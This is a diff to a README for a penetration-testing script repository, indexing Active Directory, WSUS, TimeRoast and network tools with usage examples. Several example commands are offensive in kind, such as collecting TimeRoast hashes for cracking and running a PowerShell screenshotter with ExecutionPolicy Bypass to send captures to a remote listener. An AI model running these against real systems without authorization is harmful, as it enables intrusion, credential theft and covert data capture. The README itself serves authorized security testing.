@@ -1,11 +1,127 @@
 # HacknScripts
 
-There's some scripts here someone might find useful.  
-deCIDR.sh - Expanding netblocks in CIDR notation.  
-newBoxScript.sh - Standalone Pentesting box enumeration script.
-screenshotter.ps1 - PowerShell script for screenshotting images and sending them to an attack host.
-screenshotter_receive.sh - Bash script to receive screenshotted images.
-superspoof.sh - Automatically check SPF/DMARC records on domains.
+Random pentest and lab scripts. Some are polished enough to reuse, some are quick helpers from real testing workflows.
 
-# DISCLAIMER (legal):
-If you are using this in a production environment you are cooked.
+Files intentionally stay in the repository root because external writeups and bookmarks may link directly to script names. The sections below act as the directory structure without moving paths.
+
+## Quick Index
+
+| Area | Script | What it does |
+| --- | --- | --- |
+| Network | `deCIDR.sh` | Expands CIDR blocks, IP ranges, single IPs, and hostnames into `deCIDRd.out`. Uses `nmap -sL`. |
+| Network | `superspoof.sh` | Uses Microsoft tenant/domain discovery, MX lookup, and Spoofy to check SPF/DMARC spoofability. |
+| AD/SYSVOL | `parse_sysvol.py` | Parses cloned SYSVOL GPO content for software installs, drive maps, scripts, and BloodHound correlation. |
+| AD/SYSVOL | `smb_sysvol_probe.py` | Authenticates over SMB and probes SYSVOL/Policies without relying on share listing. |
+| AD/SYSVOL | `machine_pwd_policy_probe.sh` | Uses manspider to pull SYSVOL policy files and summarize machine account password policy settings. |
+| AD/SYSVOL | `link_gpo.py` | Links a GPO to an OU over LDAPS when you have WriteGPLink rights; supports restore using saved gPLink. |
+| AD/SYSVOL | `trust_comp_enum.py` | LDAP/LDAPS trust enumeration plus computer `pwdLastSet`/creation age checks. |
+| AD/WSUS | `WSUSniff.py` | Sniffs HTTP WSUS traffic and logs servers, clients, and matched WSUS endpoints. |
+| AD/WSUS | `wsuspider.sh` | Uses manspider and regpol to find WSUS registry policy settings in SYSVOL. |
+| AD/WSUS | `wsus_auto_spider.sh` | Older positional-argument WSUS policy extractor. Prefer `wsuspider.sh` for newer usage. |
+| AD/TimeRoast | `timeroast2.py` | Current-secret MS-SNTP TimeRoast hash collector for Hashcat mode 31300. |
+| AD/TimeRoast | `timeroast_expand.py` | Expands digit-run hostname patterns for candidate generation. |
+| Remote Windows | `cimstat.py` | Reads remote file or directory metadata through WinRM/CIM without spawning PowerShell. |
+| Remote Windows | `screenshotter.ps1` | Captures desktop screenshots and sends them to a TCP listener. |
+| Remote Windows | `screenshotter_receive.sh` | Receives raw screenshot files over `nc` into `output_images/`. |
+| Remote Windows | `gimme_images.sh` | Receives base64 image blobs over `nc`, decodes them on Ctrl+C, and writes `output_images/`. |
+| Remote Windows | `send_images.sh` | Test helper for sending local images to a listener. |
+| Lab | `newBoxScript.sh` | Kali/qterminal/xdotool helper for fresh CTF-style box enumeration. |
+
+## Examples
+
+```bash
+# Expand CIDRs/ranges/hosts into deCIDRd.out
+bash deCIDR.sh targets.txt
+
+# Check spoofability for a domain
+bash superspoof.sh example.com
+
+# Parse a SYSVOL clone and correlate with BloodHound JSON
+python3 parse_sysvol.py all -s ./sysvol -b ./bloodhound
+
+# Probe SYSVOL over SMB
+python3 smb_sysvol_probe.py -H dc1.example.local --ip 192.0.2.10 -d example.local -u USER -p 'PASS' --show-gpt
+
+# Pull and summarize machine password policy settings from SYSVOL
+bash machine_pwd_policy_probe.sh -dc-ip 192.0.2.10 -d example.local -u USER -p 'PASS' -l ./loot_sysvol
+
+# List OUs before linking a GPO
+python3 link_gpo.py -u USER -p 'PASS' -d example.local -dc 192.0.2.10 --list-ous
+
+# Sniff WSUS traffic
+sudo python3 WSUSniff.py -i eth0 -p 8530
+
+# Extract WSUS policy settings from SYSVOL
+bash wsuspider.sh -dc-ip 192.0.2.10 -d example.local -u USER -p 'PASS' --no-banner
+
+# TimeRoast a DC and save Hashcat 31300 lines
+python3 timeroast2.py dc1.example.local -o timeroast_hashes.txt -r "512-1200"
+
+# Expand digit-run host patterns
+python3 timeroast_expand.py hosts.txt -o expanded_hosts.txt
+
+# Read remote file metadata over WinRM/CIM
+python3 cimstat.py dc1.example.local -d example.local -u USER -p 'PASS' -f 'C:\Windows\System32\notepad.exe'
+
+# Screenshot receiver and sender test helper
+bash screenshotter_receive.sh 4444
+powershell -ExecutionPolicy Bypass -File .\screenshotter.ps1 -Count 5 -Interval 10 -DestIP 192.0.2.10 -DestPort 4444
+bash send_images.sh 192.0.2.10 4444 ./images
+```
+
+## Dependency Notes
+
+Common external tools used across scripts include `nmap`, `nc`, `manspider`, `regpol`, `ldap3`, `impacket`, `scapy`, `pypsrp`, `rustscan`, `ffuf`, `xdotool`, `qterminal`, `Spoofy`, and `msftrecon`.
+
+Install only what you need for the script you are running. Several scripts assume Kali-style paths or tooling and may need local path edits.
+
+## Sensitive Info Check
+
+Current cleanup performed:
+
+- Removed a hardcoded private destination IP from `send_images.sh`; it now requires `<dest-ip> <dest-port> [source-dir]`.
+- Replaced concrete-looking `link_gpo.py` example credentials/domain/IP with placeholders and documentation-range IPs.
+- Removed an accidental shell transcript line from `smb_sysvol_probe.py`.
+
+Run a quick local recheck with:
+
+```bash
+rg -n --hidden -g '!.git/**' -i 'password01|api[_-]?key|client[_-]?secret|bearer|authorization:|BEGIN (RSA|OPENSSH|PRIVATE)|ghp_|github_pat_|xox[baprs]-|192\.168\.|10\.129\.|woke\.local' .
+```
+
+Expect some benign hits for private-range example IPs in usage text.
+
+## Suggested Future Layout
+
+Do not move files if you need existing links to keep working. If link stability stops mattering, this would be the clean grouping:
+
+```text
+network/
+  deCIDR.sh
+  superspoof.sh
+ad/sysvol/
+  parse_sysvol.py
+  smb_sysvol_probe.py
+  machine_pwd_policy_probe.sh
+  link_gpo.py
+  trust_comp_enum.py
+ad/wsus/
+  WSUSniff.py
+  wsuspider.sh
+  wsus_auto_spider.sh
+ad/timeroast/
+  timeroast2.py
+  timeroast_expand.py
+remote-windows/
+  cimstat.py
+  screenshotter.ps1
+  screenshotter_receive.sh
+  gimme_images.sh
+  send_images.sh
+lab/
+  newBoxScript.sh
+```
+
+## Disclaimer
+
+Use only in environments where you have authorization. Some scripts are noisy, lab-oriented, or make assumptions about local tooling and paths.
